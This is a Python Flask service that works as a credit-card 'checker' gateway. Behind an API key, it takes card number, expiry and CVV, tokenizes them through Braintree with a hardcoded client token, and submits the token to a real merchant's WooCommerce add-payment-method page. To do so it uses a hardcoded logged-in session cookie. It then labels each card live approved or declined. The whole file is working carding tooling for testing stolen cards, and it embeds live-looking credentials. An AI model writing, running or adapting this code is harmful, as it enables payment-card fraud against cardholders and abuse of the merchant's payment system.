from flask import Flask, jsonify
import requests
import re
import json

# --- Configuration ---
VALID_API_KEY = "diwazz"
BRAINTREE_CLIENT_TOKEN = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjE4NTA3MzUsImp0aSI6IjRjZjQwYTU0LTJjMjUtNDIwZC1hYzcyLWRhYzM1MzE5MmQ5NiIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.AqIvVz1rquy1ZSvRXpCOM8mRCR1d9a7AuTdCUmIcy5TCn5O5qvoejohYrxqMVud0kuPaxCnKhWaMg5gO4UBCuw'

# --- Flask App Initialization ---
app = Flask(__name__)

# --- Helper Function for BIN Lookup ---
def get_bin_details(bin_number):
    """
    BIN number se details fetch karta hai.
    """
    try:
        # BIN hamesha 6 se 8 digits ka hota hai
        card_bin = bin_number[:8] 
        headers = {'Accept-Version': '3'} # binlist.net ke liye zaroori
        response = requests.get(f"https://lookup.binlist.net/{card_bin}", headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            # Zaroori details ko extract karna
            return {
                "scheme": data.get("scheme", "N/A"),
                "type": data.get("type", "N/A"),
                "brand": data.get("brand", "N/A"),
                "country": data.get("country", {}).get("name", "N/A"),
                "bank": data.get("bank", {}).get("name", "N/A"),
            }
        else:
            # Agar BIN na mile ya koi error ho
            return {"error": "BIN details not found."}
    except Exception:
        return {"error": "Failed to fetch BIN details."}

# --- Main Checker Logic ---
def run_braintree_check(card_details):
    bin_info = {} # BIN details ke liye ek empty dictionary
    try:
        cc, mm, yy, cvv = card_details.split('|')
        
        # Pehle hi BIN details fetch kar lein
        bin_info = get_bin_details(cc)

        # --- Part 1: Braintree se Payment Nonce Generate Karna ---
        graphql_headers = {
            'accept': '*/*', 'authorization': BRAINTREE_CLIENT_TOKEN, 'braintree-version': '2018-05-10',
            'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com',
        }
        graphql_payload = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'c620b769-a8f3-4fde-9604-cc98c4e959f7'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': False}}},
            'operationName': 'TokenizeCreditCard',
        }
        
        response_graphql = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_payload)
        response_graphql.raise_for_status()
        
        braintree_data = response_graphql.json()
        if 'errors' in braintree_data:
            error_message = braintree_data['errors'][0]['message']
            return {"status": "error", "message": f"Braintree Error: {error_message}", "bin_details": bin_info, "response": "Declined"}

        payment_nonce = braintree_data['data']['tokenizeCreditCard']['token']

        # --- Part 2: Altairtech Website par Nonce Submit Karna ---
        altair_cookies = {'wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021': 'paxowe6819%7C1762973657%7CKzQSDydwyCrIBuAVkrJifs6Nm4WImWZ80QWTSVTKLRh%7C9a734dcaa14536e97b37be1d9342cdb4496380fbffd886ad33fd7734496bd923'}
        woocommerce_nonce = '0dde25e5ad'

        altair_data = {
            'payment_method': 'braintree_credit_card', 'wc_braintree_credit_card_payment_nonce': payment_nonce,
            'wc_braintree_device_data': '{"correlation_id":"ce230cbd851503d4f63f8a47ebc9eb46"}',
            'woocommerce-add-payment-method-nonce': woocommerce_nonce, '_wp_http_referer': '/account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        altair_headers = {'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://altairtech.io'}
        
        response_altair = requests.post('https://altairtech.io/account/add-payment-method/', headers=altair_headers, data=altair_data, cookies=altair_cookies)
        
        match = re.search(r'Status code\s*([^<]+)\s*</li>', response_altair.text)
        
        if match:
            status_message = match.group(1).strip()
            if "fraud" in status_message.lower() or "declined" in status_message.lower():
                return {"status": "live_declined", "message": status_message, "bin_details": bin_info, "response": "Declined"}
            elif "approved" in status_message.lower():
                 return {"status": "live_approved", "message": status_message, "bin_details": bin_info, "response": "Approved"}
            else:
                return {"status": "live_unknown", "message": status_message, "bin_details": bin_info, "response": "Unknown"}
        else:
            return {"status": "error", "message": "Altairtech session expired. Admin needs to update cookies.", "bin_details": bin_info, "response": "Error"}

    except Exception as e:
        # Agar koi bhi error aaye, toh bhi BIN details return karein
        return {"status": "error", "message": str(e), "bin_details": bin_info, "response": "Error"}


# --- API Route ---
@app.route('/gate/b3/key=<api_key>/<card_details>')
def process_payment(api_key, card_details):
    if api_key != VALID_API_KEY:
        return jsonify({"status": "error", "message": "Invalid API Key"}), 401
    if card_details.count('|') != 3:
        return jsonify({"status": "error", "message": "Invalid card format. Use cc|mm|yy|cvv"}), 400
    
    result = run_braintree_check(card_details)
    return jsonify(result)

# --- Health Check Route ---
@app.route('/')
def index():
    return "Braintree Apiiiii Is RUNNN NOOWWW NOW U CAN USE 😉😉😉😉🙂"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
